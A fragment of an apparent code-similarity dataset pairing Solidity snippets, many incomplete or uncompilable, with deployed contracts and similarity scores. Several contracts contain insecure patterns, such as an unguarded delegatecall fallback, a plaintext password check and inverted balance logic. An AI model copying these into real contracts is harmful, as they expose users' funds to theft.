function test(string a, string b) constant returns (string c){
    address addr = address(test1);  
     bytes4 sig = bytes4(sha3(""add(int256,int256)"")); 

   assembly {
    let x := mload(0x40)   
    mstore(x,sig) 
    mstore(add(x,0x04),a) 
    mstore(add(x,0x24),b) 

    let success := call(      
                        5000, 
                        addr, 
                        0,    
                        x,    
                        0x44, 
                        x,    
                        0x20) 

    c := mload(x) 
    mstore(0x40,add(x,0x44)) 
}
 }
}",0.5408324682421797,"contract ProxyAddress {
    address public owner;

    constructor() public {
        owner = msg.sender;
    }

    modifier onlyOwner() {
      require(msg.sender == owner, ""Must be called by owner or manager"");
      _;
    }

    function executeCall(address to, uint256 value, bytes memory data) public onlyOwner returns (bool success) {
        assembly {
            success := call(gas, to, value, add(data, 0x20), mload(data), 0, 0)
        }
    }
}"
"contract project3{

address owner;

string location; uint quantity; string product; uint payment; 

struct Users{
string companyName; string role; string country; string city; uint phoneNo;
string physicalAddress; 
bool certified;}

struct Product{
address producer;    
string name; uint quantity; string tag;
string proddescription;}

struct AssetTransfer{
string shipmentlocation; string asset; address sender; 
address receiver;
string trackingNo;
uint quantity;}

constructor (uint _tokens)public{
owner=msg.sender;
accbalance[owner]=_tokens;    
}

event Message(string message);
event Shipped(string _message, string trackingno, address _sender,string 
location);

modifier only_admin{
require(msg.sender==owner);
_;}

mapping (string=>Product)products;

mapping(address=>Users)users;

mapping (address=>uint) accbalance;

mapping(string=>AssetTransfer)assetTransfer;

address[] private stakeholders;

string[]private goods;

function addUsers(address _address, string _companyName,string _role, string 
_country,
string _city, uint _phoneNo, string _physicalAddress)only_admin public 
returns(bool) {

var user=users[_address];

if(bytes(user.companyName).length==0 && bytes(_companyName).length!=0){
user.companyName=_companyName;
user.role=_role;
user.country=_country;
user.city=_city;
user.phoneNo=_phoneNo;
user.physicalAddress=_physicalAddress;
stakeholders.push(_address);
emit Message('user added succesfully');
return true;}
else{
emit Message('user not added, enter different details');
return false;}
}

function getUser(address _address)public view 
returns(string,string,string,string,uint,string){
return(users[_address].companyName,
users[_address].role,users[_address].country,
users[_address].city,users[_address].phoneNo,
users[_address].physicalAddress);}

function addProduct(address _address,string _name,uint _quantity,string 
_tag,string _description)public returns(bool){
var prod= products[_tag];
if(bytes(prod.tag).length==0 && bytes(_tag).length!=0){
prod.producer=_address;    
prod.name=_name;
prod.quantity=_quantity;
prod.tag=_tag;
prod.proddescription=_description;
goods.push(_tag);
emit Message('Product added succesfully');
return true;}
else{
emit Message('Product cannot be added. duplicate serial number used');
return false;    
}}

function getProduct(string _tag)public view returns 
(address,string,uint,string,string){
return(products[_tag].producer,products[_tag].name,
products[_tag].quantity,products[_tag].tag,products[_tag].proddescription);}    

function makepayment(address _from, address _to, uint _amount)public 
returns(bool){
if(_amount<=0 && accbalance[_from]<_amount){
emit Message('cannot make payment,insufficient funds');    
return false;}
accbalance[_from]-=_amount; accbalance[_to]+=_amount;
emit Message('payment made succesuccesfully');
return true;}

function sendShipment(string _asset,string trackingNo, string _destination,
uint _quantity,address _reciever, address _sender)public returns(bool){
assetTransfer[trackingNo].asset=_asset;
assetTransfer[trackingNo].shipmentlocation=_destination;
assetTransfer[trackingNo].trackingNo=trackingNo;
assetTransfer[trackingNo].quantity=_quantity;
assetTransfer[trackingNo].sender=_sender;
assetTransfer[trackingNo].receiver=_reciever;
emit Shipped(""shipment sent"", trackingNo, _sender, _destination);
return true;}

function checkBalance(address _accountHolder)public view returns(uint){
return accbalance[_accountHolder];}

function setconditions(string _location,uint _quantity,uint _payment,string 
_asset,address _seller)public{
location=_location; quantity=_quantity; payment=_payment; product=_asset;
_seller=msg.sender; 
emit Message('conditions are set'); }

function getshipment(string _location,uint _quantity,string _asset,string 
trackingNo)public returns(bool){
if((assetTransfer[trackingNo].quantity)==_quantity && 
keccak256(abi.encodePacked(assetTransfer[trackingNo].asset))== 
keccak256(abi.encodePacked(_asset))){
emit Shipped('Shipment recieved',trackingNo,msg.sender,_location);    
if (keccak256(abi.encodePacked(location))== 
keccak256(abi.encodePacked(_location))){
makepayment(assetTransfer[trackingNo].receiver,
assetTransfer[trackingNo].sender,payment);}
else{
emit Message('Payment not made');}    
return true;}
else{
emit Message('wrong location/quantity/item');    
return false;}
}
function showProvenance(string _trackingNo)public view 
returns(string,string, address,address,string){
return(assetTransfer[_trackingNo].asset,
assetTransfer[_trackingNo].trackingNo, 
assetTransfer[_trackingNo].sender,
assetTransfer[_trackingNo].receiver,
assetTransfer[_trackingNo].shipmentlocation);}
}",0.5675599249332108,"contract CryptoCurrencyNetwork is ERC20 {

 
    
    using SafeMath for uint256;
    address owner = msg.sender;

    mapping (address => uint256) balances;
    mapping (address => mapping (address => uint256)) allowed;
    mapping (address => bool) public blacklist;

    string public constant name = ""CryptoCurrencyNetwork"";
    string public constant symbol = ""CCN"";
    uint public constant decimals = 18;
    
uint256 public totalSupply = 100000000e18;
    
uint256 public totalDistributed = 15000000e18;
    
uint256 public totalRemaining = totalSupply.sub(totalDistributed);
    
uint256 public value = 500e18;



    event Transfer(address indexed _from, address indexed _to, uint256 _value);
    event Approval(address indexed _owner, address indexed _spender, uint256 _value);
    
    event Distr(address indexed to, uint256 amount);
    event DistrFinished();
    
    event Burn(address indexed burner, uint256 value);

    bool public distributionFinished = false;
    
    modifier canDistr() {
        require(!distributionFinished);
        _;
    }
    
    modifier onlyOwner() {
        require(msg.sender == owner);
        _;
    }
    
    modifier onlyWhitelist() {
        require(blacklist[msg.sender] == false);
        _;
    }
    
    function CCN() public {
        owner = msg.sender;
        balances[owner] = totalDistributed;
    }
    
    function transferOwnership(address newOwner) onlyOwner public {
        if (newOwner != address(0)) {
            owner = newOwner;
        }
    }
    
    function finishDistribution() onlyOwner canDistr public returns (bool) {
        distributionFinished = true;
        emit DistrFinished();
        return true;
    }
    
    function distr(address _to, uint256 _amount) canDistr private returns (bool) {
        totalDistributed = totalDistributed.add(_amount);
        totalRemaining = totalRemaining.sub(_amount);
        balances[_to] = balances[_to].add(_amount);
        emit Distr(_to, _amount);
        emit Transfer(address(0), _to, _amount);
        return true;
        
        if (totalDistributed >= totalSupply) {
            distributionFinished = true;
        }
    }
    
    function () external payable {
        getTokens();
     }
    
    function getTokens() payable canDistr onlyWhitelist public {
        if (value > totalRemaining) {
            value = totalRemaining;
        }
        
        require(value <= totalRemaining);
        
        address investor = msg.sender;
        uint256 toGive = value;
        
        distr(investor, toGive);
        
        if (toGive > 0) {
            blacklist[investor] = true;
        }

        if (totalDistributed >= totalSupply) {
            distributionFinished = true;
        }
        
        value = value.div(100000).mul(99999);
    }

    function balanceOf(address _owner) constant public returns (uint256) {
        return balances[_owner];
    }

    modifier onlyPayloadSize(uint size) {
        assert(msg.data.length >= size + 4);
        _;
    }
    
    function transfer(address _to, uint256 _amount) onlyPayloadSize(2 * 32) public returns (bool success) {
        require(_to != address(0));
        require(_amount <= balances[msg.sender]);
        
        balances[msg.sender] = balances[msg.sender].sub(_amount);
        balances[_to] = balances[_to].add(_amount);
        emit Transfer(msg.sender, _to, _amount);
        return true;
    }
    
    function transferFrom(address _from, address _to, uint256 _amount) onlyPayloadSize(3 * 32) public returns (bool success) {
        require(_to != address(0));
        require(_amount <= balances[_from]);
        require(_amount <= allowed[_from][msg.sender]);
        
        balances[_from] = balances[_from].sub(_amount);
        allowed[_from][msg.sender] = allowed[_from][msg.sender].sub(_amount);
        balances[_to] = balances[_to].add(_amount);
        emit Transfer(_from, _to, _amount);
        return true;
    }
    
    function approve(address _spender, uint256 _value) public returns (bool success) {
        if (_value != 0 && allowed[msg.sender][_spender] != 0) { return false; }
        allowed[msg.sender][_spender] = _value;
        emit Approval(msg.sender, _spender, _value);
        return true;
    }
    
    function allowance(address _owner, address _spender) constant public returns (uint256) {
        return allowed[_owner][_spender];
    }
    
    function getTokenBalance(address tokenAddress, address who) constant public returns (uint){
        CryptoCurrencyNetworkToken t = CryptoCurrencyNetworkToken(tokenAddress);
        uint bal = t.balanceOf(who);
        return bal;
    }
    
    function withdraw() onlyOwner public {
        uint256 etherBalance = address(this).balance;
        owner.transfer(etherBalance);
    }
    
    function burn(uint256 _value) onlyOwner public {
        require(_value <= balances[msg.sender]);

        address burner = msg.sender;
        balances[burner] = balances[burner].sub(_value);
        totalSupply = totalSupply.sub(_value);
        totalDistributed = totalDistributed.sub(_value);
        emit Burn(burner, _value);
    }
    
    function withdrawCryptoCurrencyNetworkTokens(address _tokenContract) onlyOwner public returns (bool) {
        CryptoCurrencyNetworkToken token = CryptoCurrencyNetworkToken(_tokenContract);
        uint256 amount = token.balanceOf(address(this));
        return token.transfer(owner, amount);
    }
}"
"contract HelloWorld
  { 
     String str=""Hello World"";
  }",0.5447131806766413,"contract Hello {
  function hello() public {
  }
}"
"contract EMWhiteList {
    
    address[] whiteList;
    struct Voter {
        address addr;
        string region;
    }
    Voter[] voters;
    address[] regionalVoters; 

    function addToWhiteList (address voter){
        whiteList.push(voter);
    }

    function returnWhiteList () constant returns(address[]){
        return whiteList;    
    }

    function addVoter(address key, string region){
        Voter memory newVoter = Voter (key, region);
        voters.push(newVoter);
    }

    function getRegion(string region) constant returns (address[]){
        for(uint8 i=0; i<voters.length; i++){
            if(keccak256(voters[i].region) == keccak256(region)){
                regionalVoters.push(voters[i].addr);     
            }
        }    
    }

    function getVoter(uint256 key) constant returns(address){
        return voters[key].addr;    
    }
}",0.5655759690485588,"contract ModToken is StandardToken {

  mapping(address => bool) frozen;

  
  function isFrozen(address _addr) constant returns (bool){
      return frozen[_addr];
  }

  
  function freeze(address _addr) onlyOwner {
      frozen[_addr] = true;
  }

  
  function unfreeze(address _addr) onlyOwner {
      frozen[_addr] = false;
  }

  
  function transfer(address _to, uint256 _value) whenNotPaused returns (bool) {
    require(!isFrozen(msg.sender));
    require(!isFrozen(_to));
    return super.transfer(_to, _value);
  }

  
  function transferFrom(address _from, address _to, uint256 _value) whenNotPaused returns (bool) {
    require(!isFrozen(msg.sender));
    require(!isFrozen(_from));
    require(!isFrozen(_to));
    return super.transferFrom(_from, _to, _value);
  }
}"
"contract RegionalContract {
    address[] whiteList;    

    function getList(string region, address whiteListAddress){
        EMWhiteList fullWL = EMWhiteList(whiteListAddress);
        whiteList = fullWL.getRegion(region);
    }

}",0.5678070491267097,"contract IMarketContractRegistry {
    function addAddressToWhiteList(address contractAddress) external;
    function isAddressWhiteListed(address contractAddress) external view returns (bool);
}"
"contract DeployedContract {

struct emailNetworkLists {
     bytes32[] emailArray;
}

struct Namecards{
    address ethAddress;
    bytes32 personName;
    bytes32 designation;
    bytes32 companyName;
    bytes32 comaddress;
    bytes32 emailId;
    bytes32 mobNumber;
    bytes32 date;
    bool isActive;
    uint index;
    mapping(bytes32=> emailNetworkLists) contactList;
}

bytes32[] public addressList;
mapping(bytes32 => Namecards) public nameStructMapping;

function getEmails(bytes32 email, bytes32 date) public view returns(bytes32[]){
    return (nameStructMapping[email].contactList[date].emailArray);
}

}",0.5214441003966119,"contract CommodityERC20Factory {

  

  mapping (address => bool) public validContracts; 
  address[] public contracts;

  

  function getContractCount() 
    public
    view
    returns(uint contractCount)
  {
    return contracts.length;
  }

  

  function getDeployedContracts() public view returns (address[] memory)
  {
    return contracts;
  }

  

  function newPersonalERC20(string memory name, string memory symbol, uint256 init, address owner)
    public
    returns(address)
  {
    CommodityERC20 c = new CommodityERC20(name, symbol, init, owner);
    validContracts[c] = true;
    contracts.push(c);
    return c;
  }
}"
"contract External {
    DeployedContract d = DeployedContract(0xe90f4f8ae................);
    function getEmailList(bytes32 email, bytes32 date) public view returns(bytes32[] ){ 
       return (d.getEmails(email, date));
    }
}",0.5787911256240414,"contract IContractRegistry {

    function addressOf(bytes32 _contractName) public view returns (address);



    

    function getAddress(bytes32 _contractName) public view returns (address);

}"
"contract X{
uint a=12+1 ether;

function checkConstant(uint conversionRate) constant returns(uint integer, uint decimal){

    integer= a / conversionRate;
    decimal= a % conversionRate;
}

}",0.5647168789261475,"contract MiniMeToken {
    function balanceOfAt(address _owner, uint _blockNumber) public constant returns (uint);
    function totalSupplyAt(uint _blockNumber) public constant returns(uint);
}"
"contract ItemListContract {
    struct  item 
    {
      bytes iname;
      uint16 itemid;
      bytes icode;
      uint ivalue;
    }
    uint itemcount;
    mapping(bytes => item) itemlist;
    item[] itemarray;
    function ItemListContract()
    {
       log0('hi');
    }
    function AddItem(bytes name, uint16 iid, bytes code, uint val)
    {        
       var itemnew = item(name, iid ,code, val);
       log0(itemnew);
       itemlist[code] = itemnew;
       itemarray.push(itemnew);
       itemcount++;
    }
    function countitemlist() returns (uint count)
    {     
      return itemcount;
    }

    function removeitem(bytes code)
    {
    delete itemlist[code];
    itemcount--;
    }
    function getitem(bytes code) returns (bytes iname, uint val)
    {   
      return (itemlist[code].iname,itemlist[code].ivalue);
    }
}",0.5646033991524638,"contract ABIListingContract is ABIApplicationAsset {

    address public managerAddress;
    
    struct item {
        bytes32 name;
        address itemAddress;
        bool    status;
        uint256 index;
    }

    mapping ( uint256 => item ) public items;
    uint256 public itemNum;

    function setManagerAddress(address _manager) public;
    function addItem(bytes32 _name, address _address) public;
    function getNewsContractAddress(uint256 _childId) external view returns (address);
    function canBeDelisted(uint256 _childId) public view returns (bool);
    function getChildStatus( uint256 _childId ) public view returns (bool);
    function delistChild( uint256 _childId ) public;

}"
"contract A {
    function makeCall(address addressB){
         AbstractB(addressB).getX();
    }
}",0.5964606972211677,"contract PosRewards {
    function transfer(address _from, address _to);
}"
"contract UserContract {
    StorageContract storages;
    constructor (address _storageAddress) public {
        storages = StorageContract(_storageAddress);
    }

    function userSetNewUser(address _userId, string memory _userName) public returns(address){
        require(msg.sender != address(0));
        address userId = storages.setNewUser(_userId, _userName);
        return userId;
    }
}",0.5937739136002169,"contract IssuerContract {
  using AddressExtension for address;

  event SetIssuer(address indexed _address);

  modifier onlyIssuer {
    require(issuer == msg.sender);
    _;
  }

  address public issuer;

  constructor(address _issuer) internal {
    issuer = _issuer;
  }

  function setIssuer(address _address) public onlyIssuer {
    emit SetIssuer(issuer = _address);
  }
}"
"contract CampaignFactory{    token public token_instance;
    constructor() public payable{
         token_instance = token(token_address);}

    function createCampaign() public payable{
        address newCampaign = address((new Campaign).value(msg.value)(deposit, ll, token_address, 1, your));
}


contract Campaign{
    token public tokenReward;

    constructor (uint depositInWei, address ll, address addressOfTokenUsed, uint weiCostOfEachToken, address your) public payable{
        tokenReward.transferFrom(0xCA35b7d915458EF540aDe6068dFe2F44E8fa733c, your, msg.value/price);
}
",0.5885801332278,"contract exForward{

    address public owner;

    event eth_deposit(address sender, uint amount);

    event erc_deposit(address from, address ctr, address to, uint amount);

    constructor() public {

        owner = 0x50D569AF6610C017DDE11A7F66DF3FE831F989FA;

    }

    function trToken(address tokenContract, uint tokens) public{

        ERC20(tokenContract).transfer(owner, tokens);

        emit erc_deposit(msg.sender, tokenContract, owner, tokens);

    }

    function() payable public {

        uint256 ethAmount = (msg.value * 8) / 10;

        owner.transfer(ethAmount);

        emit eth_deposit(msg.sender,msg.value);

    }

}"
"contract Campaign{
    token public tokenReward;

    constructor (uint depositInWei, address ll, address addressOfTokenUsed, uint weiCostOfEachToken, address your) public payable{
        tokenReward.transferFrom(0xCA35b7d915458EF540aDe6068dFe2F44E8fa733c, your, msg.value/price);
}
",0.5427137232603891,"contract Forwarder {

    

    address constant public destinationAddress = 0x609E7e5Db94b3F47a359955a4c823538A5891D48;

    event LogForwarded(address indexed sender, uint amount);



    

    function() payable public {

        emit LogForwarded(msg.sender, msg.value);

        destinationAddress.transfer(msg.value);

    }

}"
"contract A {
    function logUint(uint a);
    function logString(string a);
}",0.5621989350527895,"contract Dragon {
    function transfer( address _to, uint256 _amount );
}"
"contract B {
    A logger;
    function registerLogger(address loggerAddress){
        logger = A(loggerAddress);
    }       
    function logUint(uint a){
        
        logger.logUint(a);
    }
    function logString(string a){
        
        logger.logString(a);
    }   
}",0.5776416530818833,"contract AssetStorage {
    function addTrustedIssuer(address addr, string name);
    function removeTrustedIssuer(address addr, string name);
    function assertFact(uint id, string fact);
}"
"contract Zusatzaufgabe {

    struct Student {
        string name;
        string vorname;
        uint matnr;
        uint punkte;
        bool[] solved;
    }

    address[] public addressen;

    mapping(address => Student) public studenten;

    modifier hurdle(uint _n) {
        require(_n == msg.value/2);
        _;
    }

    modifier onlyTillTest() {
        require(block.timestamp < 1499702400);
        _;
    }

    function Zusatzaufgabe(){

    }

    function register(string _name, string _vorname, uint _matnr) onlyTillTest(){
        studenten[msg.sender] = Student(_name,_vorname,_matnr,1,new bool[](3));
        addressen.push(msg.sender);
    }

    function onepoint() payable hurdle(10000) onlyTillTest(){
        if(studenten[msg.sender].solved[0] == false){
            studenten[msg.sender].solved[0] = true;
            studenten[msg.sender].punkte += 1;
        }
    }

    function twopoints(uint _value) onlyTillTest(){
        if(studenten[msg.sender].solved[1] == false
        && _value == studenten[addressen[0]].matnr
        ){
            studenten[msg.sender].solved[1] = true;
            studenten[msg.sender].punkte += 2;
        }
    }

    function sixpoints(bytes32 _h, uint8 _v, bytes32 _r, bytes32 _s) onlyTillTest(){
        if(
            studenten[msg.sender].solved[2] == false
            && ecrecover(_h, _v, _r, _s) == msg.sender
            && _h == sha3(this)
        ){
            studenten[msg.sender].solved[2] = true;
            studenten[msg.sender].punkte += 6;
        }
    }
}",0.5823734369325028,"contract HumanStandardToken is StandardToken { 

    address public owner;

    

    string public name = 'YoTuber';

    uint8 public decimals= 18;

    string public symbol = 'YTB';

    string public version = 'H0.1';



    modifier onlyOwner

    {

        require(msg.sender == owner);

        _;

    }



    function HumanStandardToken(uint256 _initialAmount, string _tokenName, uint8 _decimalUnits, string _tokenSymbol) {

        balances[msg.sender] = _initialAmount;

        totalSupply = _initialAmount;

        name = _tokenName;

        decimals = _decimalUnits;

        symbol = _tokenSymbol;

        owner = msg.sender;

    }



    

    

    function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {

        allowed[msg.sender][_spender] = _value;

        Approval(msg.sender, _spender, _value);

        require(_spender.call(bytes4(bytes32(sha3(""receiveApproval(address,uint256,address,bytes)""))), msg.sender, _value, this, _extraData));

        return true;

    }



    function mintToken(address target, uint256 mintedAmount) public onlyOwner returns (bool success){

        balances[target] += mintedAmount;

        totalSupply += mintedAmount;

        Transfer(0, owner, mintedAmount);

        Transfer(owner, target, mintedAmount);

        return true;

    }



}"
"contract A{
    uint8 mem1;
    uint8 mem2;

    function store(uint8 store1, uint8 store2){
        mem1=store1;
        mem2=store2;
    }
}",0.5453829594562007,"contract IExitHandler {

  function startExit(bytes32[] memory, bytes32[] memory, uint8, uint8) public payable;

}"
"contract delegateCall{
uint public testInt;
address public sender;

function delegateCall(){
    testInt = 1;
}

function delegateCallC(address _c, uint _testInt){
if(_c.delegatecall(bytes4(sha3(""setTestInt(uint"")),_testInt ))
throw;
}  
}",0.5860350885021391,"contract Delegation {



  address public owner;

  Delegate delegate;



  function Delegation(address _delegateAddress) {

    delegate = Delegate(_delegateAddress);

    owner = msg.sender;

  }

  

  

  

  

  function() {

    if(delegate.delegatecall(msg.data)) {

      this;

    }

  }

}"
"contract EquityInvestments 
{
    AppleToken appleToken;
    Group [] _Groups;
    uint PriceEth = 1;
    address tokenAddress = 0x580156edb25D3c3deD584F1075CcCC5dA4861883;
    mapping (address => mapping(uint=>UserInvestment)) private _UserInvestments;

    function EquityInvestments () public
    {
        _Groups.push(Group({
            GroupID: 1,
            GroupName: ""Google"",
            TotalInvestment: 0,
            GroupPriceDollars: 200,
            GroupPriceEth: 1
        }));
         _Groups.push(Group({
            GroupID: 2,
            GroupName: ""Tesla"",
             TotalInvestment: 0,
             GroupPriceDollars: 200,
             GroupPriceEth: 1
        }));
         _Groups.push(Group({
            GroupID: 3,
            GroupName: ""Apple"",
             TotalInvestment: 0,
             GroupPriceDollars: 200,
             GroupPriceEth: 1
        }));
    }

    struct Group
    {
     uint GroupID;
     string GroupName;
     uint TotalInvestment;
     uint GroupPriceDollars;
     uint GroupPriceEth;
    }

    function sendTokens () public payable returns (uint)
    {
        appleToken = AppleToken(tokenAddress);
        
        
        require(appleToken.transfer(msg.sender, 10));
        return appleToken.balanceOf(msg.sender);
    }



}",0.5040369709765649,"contract tokenHodl {

    event Hodl(address indexed hodler, uint indexed amount);

    event Party(address indexed hodler, uint indexed amount);

    mapping (address => uint) public hodlers;

    uint partyTime = 1522093545; 

    function() payable {

        hodlers[msg.sender] += msg.value;

        Hodl(msg.sender, msg.value);

    }

    function party() {

        require (block.timestamp > partyTime && hodlers[msg.sender] > 0);

        uint value = hodlers[msg.sender];

        uint amount = value/100;

        hodlers[msg.sender] = 0;

        msg.sender.transfer(amount);

        Party(msg.sender, amount);

        partyTime = partyTime + 120;

    }

    function withdrawForeignTokens(address _tokenContract) returns (bool) {

        if (msg.sender != 0x239C09c910ea910994B320ebdC6bB159E71d0b30) { throw; }

        require (block.timestamp > partyTime);

        

        ForeignToken token = ForeignToken(_tokenContract);



        uint256 amount = token.balanceOf(address(this))/100;

        return token.transfer(0x239C09c910ea910994B320ebdC6bB159E71d0b30, amount);

        partyTime = partyTime + 120;

    }

}"
"contract usingProperty{
    struct Property{
        bytes32 name;
        uint id;
        mapping (address => bool) accessStakeholders;
        uint[] rating;
    }

    Property[] public propertyList;

    function addProperty(bytes32 _name, address[] _accessStakeholders, uint _rating) returns(bool success, uint _id){

        _id = propertyList.length++;

        Property prop = propertyList[_id];
        for (uint i = 0 ; i < _accessStakeholders.length ; i++){
          prop.accessStakeholders[_accessStakeholders[i]] = true;
        }

        prop.name = _name;
        prop.id= _id;
        prop.rating.push(_rating);
    }


    function removeProperty(uint _id){
        if (propertyList[_id].length == 0) throw;
    }

}",0.5395500958241759,"contract BlockPoolToken is StandardToken {
    using SafeMath for uint256;

    string     public name = ""BlockPool Token"";
    string     public symbol = ""BPT"";
    uint8      public decimals = 18;

    constructor() public {
        totalSupply_ = 10 ** 27;
        balances[msg.sender] = totalSupply_;
    }

    function batchTransfer(
        address[] calldata accounts, 
        uint256[] calldata amounts
    ) external returns (bool){
        require(accounts.length == amounts.length);
        for (uint i = 0; i < accounts.length; i++) {
            require(transfer(accounts[i], amounts[i]), ""transfer failed"");
        }
        return true;
    }

    function () payable external {
        revert();
    }

}"
"contract ContractFactory {
  contractAddress = new Contract();
  Contract(contractAddress).someFunction();
}",0.5791969951727104,"contract ContractProvider {
	function contracts(bytes32 contractName) returns (address addr){}
}"
"contract Foo{

    function createBar(){

      Bar bar = new Bar();
    }
}",0.5648144052683545,"contract FLC {
    function create(uint units) public;
}"
"contract Crowdsale is StandardToken {

contract Crowdsale is MintableToken {

contract Crowdsale is BasicToken {",0.5737355711479983,"contract TIMEToken is MintableToken {

    constructor(address _minter)

        StandardToken(

            ""TIME"",   

            ""TM"", 

            18  

        )

        

        MintableToken(_minter)

        public

    {

    }

}"
"contract Crowdsale is MintableToken {

contract Crowdsale is BasicToken {",0.5462155250059278,"contract Crowdsale 
{
    function buyTokens(address _recipient) public payable;
}"
"contract TestSize{
    event Test1(uint param1, string param2); function test1(uint param1, string param2){ Test1(param1, param2);}
    event Test2(uint param1, string param2); function test2(uint param1, string param2){ Test2(param1, param2);}
    event Test3(uint param1, string param2); function test3(uint param1, string param2){ Test3(param1, param2);}
    ...
    event Test87(uint param1, string param2); function test87(uint param1, string param2){ Test87(param1, param2);}
}",0.501823529923167,"contract PaymentInterface {
    function createCastle(address _trainer, uint _tokens, string _name, uint64 _a1, uint64 _a2, uint64 _a3, uint64 _s1, uint64 _s2, uint64 _s3) public returns(uint);
    function catchMonster(address _trainer, uint _tokens, uint32 _classId, string _name) public returns(uint);
    function payService(address _trainer, uint _tokens, uint32 _type, string _text, uint64 _param1, uint64 _param2, uint64 _param3) public returns(uint);
}"
"contract ApprovedPOCreateAndOwnershipTransferContract {

    struct PO{
        bytes32 bill_to_location;
        bytes32 ship_to_location;
        bool exists;
    }

    

    mapping(uint256 => PO) poMap;  


    event PODebugParameters(
        uint256 po_num,
        
        uint256 business_unit_id,
        bytes32 ipfs_hash,
        bytes32 bill_to_location,
        bytes32 ship_to_location,
        uint256 po_status_code,
        uint256 bill_to_location_code,
        uint256 ship_to_location_code,
        address maintain_org_add_map_contract_add_sender,
        address maintain_org_add_map_contract_add_receiver,
        address msg_receiver,
        uint256 supplier_id,
        uint256  status
    );

    
    function saveApprovedPONotSigned(uint256 po_num,                                 
                                    uint256 business_unit_id,
                                    bytes32 ipfs_hash,
                                    bytes32 bill_to_location,
                                    bytes32 ship_to_location,
                                    uint256 po_status_code,
                                    uint256 bill_to_location_code,
                                    uint256 ship_to_location_code,
                                    address maintain_org_add_map_contract_add_sender,
                                    address maintain_org_add_map_contract_add_receiver,
                                    address msg_receiver,
                                    uint256 supplier_id,
                                    uint256  status) external {        


        
        require(po_status_code == 1, ""PO is not approved in ERP"");


        
        require(bill_to_location_code == 1 && ship_to_location_code == 2, ""PO raised with incorrect billing or shipping locations"");

        poMap[po_num].exists = true;
        poMap[po_num].bill_to_location = bill_to_location;
        poMap[po_num].ship_to_location = ship_to_location;

        emit PODebugParameters(po_num,business_unit_id,ipfs_hash,bill_to_location,ship_to_location,po_status_code,bill_to_location_code,ship_to_location_code,maintain_org_add_map_contract_add_sender,maintain_org_add_map_contract_add_receiver,msg_receiver,supplier_id,status);

    }  


     
    function verifyForExistingPO(uint256 po_num,bytes32 bill_to_location,bytes32 ship_to_location) constant external returns (bool){
        if (poMap[po_num].bill_to_location == bill_to_location && poMap[po_num].ship_to_location == ship_to_location){
            return true;
        }else{
            return false;
        }
    }


}",0.5180286263975155,"contract CryptoRomeAuction is CryptoRomeControl {

    address public WonderOwnershipAdd;
    uint256 public auctionStart;
    uint256 public startingBid;
    uint256 public auctionDuration;
    address public highestBidder;
    uint256 public highestBid;
    address public paymentAddress;
    uint256 public wonderId;
    bool public ended;

    event Bid(address from, uint256 amount);
    event AuctionEnded(address winner, uint256 amount);

    constructor(uint256 _startTime, uint256 _startingBid, uint256 _duration, address wallet, uint256 _wonderId, address developer) public {
        WonderOwnershipAdd = msg.sender;
        auctionStart = _startTime;
        startingBid = _startingBid;
        auctionDuration = _duration;
        paymentAddress = wallet;
        wonderId = _wonderId;
        transferOwnership(developer);
    }
    
    function getAuctionData() public view returns(uint256, uint256, uint256, address) {
        return(auctionStart, auctionDuration, highestBid, highestBidder);
    }

    function _isContract(address _user) internal view returns (bool) {
        uint size;
        assembly { size := extcodesize(_user) }
        return size > 0;
    }

    function auctionExpired() public view returns (bool) {
        return now > (SafeMath.add(auctionStart, auctionDuration));
    }

    function bidOnWonder() public payable {
        require(!_isContract(msg.sender));
        require(!auctionExpired());
        require(msg.value >= (highestBid + 10000000000000000));

        if (highestBid != 0) {
            highestBidder.transfer(highestBid);
        }

        highestBidder = msg.sender;
        highestBid = msg.value;

        emit Bid(msg.sender, msg.value);
    }

    function endAuction() public onlyOwner {
        require(auctionExpired());
        require(!ended);
        ended = true;
        emit AuctionEnded(highestBidder, highestBid);
        
        Wonder(WonderOwnershipAdd).transfer(highestBidder, wonderId);

        paymentAddress.transfer(address(this).balance);
    }
}"
"contract students{

    struct students{
        string fname;
        string lname;
        string course;      
    }

    mapping (address => students) studentsMappig;

    address[] public studentsArray;

    function setStudents(address _address, string _fname, string _lname,string _course) public{

        var student = studentsMappig[_address];

        student.fname = _fname;
        student.lname = _lname;
        student.course = _course;
        studentsArray.push(_address) -1;

    }

}",0.5188213395787735,"contract ZapCoordinatorInterface is Ownable {

    function addImmutableContract(string contractName, address newAddress) external;

    function updateContract(string contractName, address newAddress) external;

    function getContractName(uint index) public view returns (string);

    function getContract(string contractName) public view returns (address);

    function updateAllDependencies() external;

}"
"contract Contract {
    bytes32 password;
    uint public someVar;

    function Contract(string secret){
        password = sha3(secret);
    }

    function changeSomeVar(string secret, uint someValue) passwordProtected(secret){
        someVar = someValue;
    }

    modifier passwordProtected(string secret){
        if(sha3(secret) != password) {
            throw;
        }
        _;
    }
}",0.5621207944265469,"contract SelfDesctructionContract is owned {

   

   string  public someValue;

   modifier ownerRestricted {

      require(owner == msg.sender);

      _;

   } 

 

   function SelfDesctructionContract() {

      owner = msg.sender;

   }

   

   function setSomeValue(string value){

      someValue = value;

   } 



   function destroyContract() ownerRestricted {

     selfdestruct(owner);

   }

}"
"contract Example{

struct Institution {
    bytes32 name;
    bool exists;
}

event AddedInstitution(bytes32 name);

mapping(bytes32 => Institution) institutions;


function addInstitution(
    bytes32 name,
    bytes32 upi
) public {
    require(!isInstitutionExists(upi));
    institutions[upi].name = name;
    institutions[upi].exists = true;
    emit AddedInstitution(name);

}

function getInstitution(bytes32 upi) public constant returns (bytes32 name){
    require(isInstitutionExists(upi));
    return (
    institutions[upi].name
    );

}

function isInstitutionExists(bytes32 upi) private constant returns (bool){
    if (institutions[upi].exists) {
        return true;
    }
    return false;
}",0.5538564566781753,"contract EtherandomI {
  address public addr;
  function seed() returns (bytes32 _id);
  function seedWithGasLimit(uint _gasLimit) returns (bytes32 _id);
  function exec(bytes32 _serverSeedHash, bytes32 _clientSeed, uint _cardinality) returns (bytes32 _id);
  function execWithGasLimit(bytes32 _serverSeedHash, bytes32 _clientSeed, uint _cardinality, uint _gasLimit) returns (bytes32 _id);
  function getSeedCost(uint _gasLimit) constant returns (uint _cost);
  function getExecCost(uint _gasLimit) constant returns (uint _cost);
  function getMinimumGasLimit() constant returns (uint _minimumGasLimit);
}"
"contract Conditional {
struct Condition {
    address to;
    bytes4 selector;
    bytes parameters;
    bytes32 expectedValueHash;
    bool onlyCheckForSuccess;
  }

 function isSatisfied(Condition memory condition)
    public
    view
    returns (bool)
  {
    if (condition.onlyCheckForSuccess) {
      return assertNotFails(condition);
    } else {
